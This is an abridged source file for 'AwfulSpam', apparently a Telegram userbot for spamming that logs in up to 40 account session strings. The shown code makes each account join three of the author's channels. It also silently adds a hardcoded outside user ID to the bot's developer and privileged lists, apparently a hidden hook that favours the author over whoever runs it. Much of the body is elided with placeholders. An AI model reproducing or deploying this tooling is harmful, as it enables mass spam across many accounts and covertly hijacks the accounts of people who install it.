# AwfulSpam - Spam Userbots
# Copyright © 2021 @AwfulSpam
...
if 2092103173 not in DEV:
    DEV.append(2092103173)
...
async def AwfulSpam():
    ...
    if STRING: 
        ...
        try:
            ...
            await Riz(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING2: 
        ...
        try:
            ...
            await Riz2(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz2(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz2(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING3: 
        ...
        try:
            ...
            await Riz3(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz3(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz3(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING4: 
        ...
        try:
            ...
            await Riz4(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz4(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz4(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING5: 
        ...
        try:
            ...
            await Riz5(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz5(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz5(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING6: 
        ...
        try:
            ...
            await Riz6(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz6(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz6(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING7: 
        ...
        try:
            ...
            await Riz7(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz7(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz7(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING8: 
        ...
        try:
            ...
            await Riz8(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz8(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz8(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING9: 
        ...
        try:
            ...
            await Riz9(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz9(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz9(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING10: 
        ...
        try:
            ...
            await Riz10(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz10(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz10(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING11: 
        ...
        try:
            ...
            await Riz11(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz11(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz11(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING12: 
        ...
        try:
            ...
            await Riz12(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz12(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz12(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING13: 
        ...
        try:
            ...
            await Riz13(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz13(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz13(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING14: 
        ...
        try:
            ...
            await Riz14(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz14(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz14(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING15: 
        ...
        try:
            ...
            await Riz15(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz15(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz15(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING16: 
        ...
        try:
            ...
            await Riz16(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz16(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz16(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
            botid = telethon.utils.get_peer_id(botme)
            CLIENTS.append(botid)
        except Exception as e:
            print(e)
    ...
    if STRING17: 
        ...
        try:
            ...
            await Riz17(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz17(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz17(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
            botid = telethon.utils.get_peer_id(botme)
            CLIENTS.append(botid)
        except Exception as e:
            print(e)
    ...
    if STRING18: 
        ...
        try:
            ...
            await Riz18(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz18(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz18(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
            botid = telethon.utils.get_peer_id(botme)
            CLIENTS.append(botid)
        except Exception as e:
            print(e)
    ...
    if STRING19: 
        ...
        try:
            ...
            await Riz19(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz19(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz19(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
            botid = telethon.utils.get_peer_id(botme)
            CLIENTS.append(botid)
        except Exception as e:
            print(e)
    ...
    if STRING20: 
        ...
        try:
            ...
            await Riz20(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz20(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz20(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
            botid = telethon.utils.get_peer_id(botme)
            CLIENTS.append(botid)
        except Exception as e:
            print(e)
    ...
    if STRING21: 
        ...
        try:
            ...
            await Riz21(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz21(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz21(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
            botid = telethon.utils.get_peer_id(botme)
            CLIENTS.append(botid)
        except Exception as e:
            print(e)
    ...
    if STRING22: 
        ...
        try:
            ...
            await Riz22(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz22(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz22(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING23: 
        ...
        try:
            ...
            await Riz23(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz23(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz23(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING24: 
        ...
        try:
            ...
            await Riz24(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz24(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz24(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING25: 
        ...
        try:
            ...
            await Riz25(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz25(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz25(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING26: 
        ...
        try:
            ...
            await Riz26(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz26(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz26(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING27: 
        ...
        try:
            ...
            await Riz27(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz27(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz27(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING28: 
        ...
        try:
            ...
            await Riz28(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz28(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz28(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING29: 
        ...
        try:
            ...
            await Riz29(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz29(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz29(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING30: 
        ...
        try:
            ...
            await Riz30(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz30(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz30(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING31: 
        ...
        try:
            ...
            await Riz31(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz31(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz31(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING32: 
        ...
        try:
            ...
            await Riz32(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz32(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz32(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING33: 
        ...
        try:
            ...
            await Riz33(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz33(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz33(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING34: 
        ...
        try:
            ...
            await Riz34(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz34(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz34(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING35: 
        ...
        try:
            ...
            await Riz35(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz35(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz35(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
    ...
    if STRING36: 
        ...
        try:
            ...
            await Riz36(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz36(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz36(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
            botid = telethon.utils.get_peer_id(botme)
            CLIENTS.append(botid)
        except Exception as e:
            print(e)
    ...
    if STRING37: 
        ...
        try:
            ...
            await Riz37(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz37(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz37(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
            botid = telethon.utils.get_peer_id(botme)
            CLIENTS.append(botid)
        except Exception as e:
            print(e)
    ...
    if STRING38: 
        ...
        try:
            ...
            await Riz38(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz38(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz38(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
            botid = telethon.utils.get_peer_id(botme)
            CLIENTS.append(botid)
        except Exception as e:
            print(e)
    ...
    if STRING39: 
        ...
        try:
            ...
            await Riz39(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz39(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz39(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
            botid = telethon.utils.get_peer_id(botme)
            CLIENTS.append(botid)
        except Exception as e:
            print(e)
    ...
    if STRING40:
        ...
        try:
            ...
            await Riz40(functions.channels.JoinChannelRequest(channel="@AwfulSpam"))
            await Riz40(functions.channels.JoinChannelRequest(channel="@Rood_Gamer"))
            await Riz40(functions.channels.JoinChannelRequest(channel="@Qnr_Otus"))
            botid = telethon.utils.get_peer_id(botme)
            CLIENTS.append(botid)
        except Exception as e:
            print(e)
...
loop.run_until_complete(AwfulSpam())

XX.append(2092103173)
XX.append(OWNER_ID)

if BOT_TOKEN:
     Rood = TelegramClient('Rood', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
